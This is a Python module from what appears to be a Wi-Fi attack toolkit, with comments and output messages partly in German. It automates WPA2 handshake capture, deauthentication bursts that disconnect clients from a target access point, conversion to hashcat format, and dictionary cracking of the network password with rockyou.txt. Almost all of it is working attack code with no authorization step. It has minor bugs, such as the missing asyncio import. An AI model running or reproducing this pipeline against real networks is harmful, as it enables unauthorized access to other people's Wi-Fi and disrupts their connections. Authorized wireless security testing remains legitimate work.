import os
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp
from typing import AsyncGenerator


HELP = ToolHelp(
    name="Handshake Capture",
    description="Captures WPA2 4-way handshake by sending deauth packets to force client reconnection. Saves .cap file for offline cracking.",
    usage="Requires: target BSSID, channel, client MAC (optional but faster), monitor interface.",
    danger_note="🟠 Medium Risk — sends deauth frames, briefly disconnects clients from target AP.",
    example="airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
)

DANGER = DangerLevel.ORANGE


class HandshakeCapture:
    def __init__(self, interface: str = "wlan0mon", output_dir: str = "/tmp"):
        self.interface = interface
        self.output_dir = output_dir
        self._capture_runner = CommandRunner()
        self._deauth_runner = CommandRunner()

    async def capture(
        self,
        bssid: str,
        channel: str,
        output_name: str = "handshake",
    ) -> AsyncGenerator[str, None]:
        out_path = os.path.join(self.output_dir, output_name)
        yield f"[*] Targeting {bssid} on channel {channel}"
        yield f"[*] Saving capture to {out_path}-01.cap"
        yield "[*] Waiting for handshake — trigger deauth from Deauth module..."

        async for line in self._capture_runner.run([
            "airodump-ng",
            "-c", channel,
            "--bssid", bssid,
            "-w", out_path,
            "--output-format", "cap",
            self.interface,
        ]):
            if "WPA handshake" in line:
                yield f"[+] HANDSHAKE CAPTURED! {line}"
            else:
                yield line

    async def deauth_burst(
        self,
        bssid: str,
        client: str = "FF:FF:FF:FF:FF:FF",
        count: int = 5,
    ) -> AsyncGenerator[str, None]:
        yield f"[*] Sending {count} deauth frames → {bssid} (client: {client})"
        async for line in self._deauth_runner.run([
            "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid,
            "-c", client,
            self.interface,
        ]):
            yield line

    async def verify_cap(self, cap_path: str) -> AsyncGenerator[str, None]:
        yield f"[*] Verifying handshake in {cap_path}..."
        async for line in CommandRunner().run([
            "aircrack-ng", cap_path
        ]):
            if "WPA" in line or "handshake" in line.lower():
                yield f"[+] {line}"
            else:
                yield line

    async def auto_crack_pipeline(
        self,
        bssid: str,
        channel: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        client: str = "FF:FF:FF:FF:FF:FF",
        deauth_count: int = 5,
    ) -> AsyncGenerator[str, None]:
        """
        Vollautomatische Pipeline: Capture → Deauth → Handshake → Convert → Crack.
        Alles in einem Schritt. Nichts manuell nötig.
        """
        from core.output_dir import get as out_dir, new_file
        import os

        out = out_dir("wifi")
        cap_base = str(out / f"hs_{bssid.replace(':','')}")
        cap_file  = cap_base + "-01.cap"
        hc_file   = cap_base + ".hc22000"

        yield f"[*] AUTO-CRACK PIPELINE für {bssid}"
        yield f"[*] Schritt 1/4: Starte Capture auf Kanal {channel}..."

        # Capture im Hintergrund
        capture_task = asyncio.create_task(self._run_capture(bssid, channel, cap_base))

        # Deauth nach 3 Sekunden
        yield "[*] Schritt 2/4: Sende Deauth-Pakete..."
        await asyncio.sleep(3)
        async for line in self.deauth_burst(bssid, client, deauth_count):
            yield f"  [deauth] {line}"

        # Warte auf Handshake (max 30s)
        yield "[*] Warte auf Handshake..."
        for _ in range(30):
            await asyncio.sleep(1)
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 1024:
                # Prüfe ob Handshake drin
                proc = await asyncio.create_subprocess_exec(
                    "aircrack-ng", cap_file,
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                if b"WPA" in stdout or b"handshake" in stdout.lower():
                    yield f"[+] Handshake gefunden!"
                    break
        else:
            yield "[!] Kein Handshake nach 30s — sende weiteren Deauth..."
            async for line in self.deauth_burst(bssid, client, 10):
                yield f"  {line}"
            await asyncio.sleep(5)

        capture_task.cancel()
        await asyncio.sleep(1)

        # Convert zu hc22000 für hashcat
        yield f"[*] Schritt 3/4: Konvertiere zu hashcat-Format (hc22000)..."
        async for line in CommandRunner().run([
            "hcxpcapngtool", "-o", hc_file, cap_file
        ]):
            if line.strip():
                yield f"  {line}"

        import os
        if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
            # Fallback: aircrack-ng direkt
            yield "[*] hcxpcapngtool fehlgeschlagen — nutze aircrack-ng direkt..."
            hc_file = cap_file
            yield f"[+] Nutze .cap direkt: {cap_file}"
        else:
            yield f"[+] Hash-Datei: {hc_file}"

        # Cracken mit hashcat
        yield f"[*] Schritt 4/4: Cracke mit hashcat + {wordlist}..."
        yield f"[*] Dies kann Minuten bis Stunden dauern..."

        if hc_file.endswith(".hc22000"):
            crack_mode = "22000"
        else:
            crack_mode = "22000"
            # Bei .cap: erst zu .hc22000 konvertieren mit hcxpcapngtool

        async for line in CommandRunner().run([
            "hashcat", "-m", crack_mode, hc_file, wordlist,
            "--force", "--status", "--status-timer=10",
            "-o", str(out / f"cracked_{bssid.replace(':','')}.txt"),
        ]):
            if "KEY FOUND" in line.upper() or "Recovered" in line:
                yield f"[!!!] PASSWORT GEFUNDEN: {line}"
            elif line.strip() and not line.startswith("Session"):
                yield f"  {line}"

        # Ergebnis anzeigen
        result_file = str(out / f"cracked_{bssid.replace(':','')}.txt")
        if os.path.exists(result_file):
            yield ""
            yield "═" * 50
            with open(result_file) as f:
                for l in f:
                    yield f"[+] CRACKED: {l.strip()}"
            yield "═" * 50

    async def _run_capture(self, bssid: str, channel: str, out_base: str):
        """Hilfsfunktion: Capture im Hintergrund."""
        proc = await asyncio.create_subprocess_exec(
            "airodump-ng", "-c", channel, "--bssid", bssid,
            "-w", out_base, "--output-format", "cap", self.interface,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            await proc.wait()
        except asyncio.CancelledError:
            proc.terminate()

    async def stop(self):
        await self._capture_runner.stop()
        await self._deauth_runner.stop()
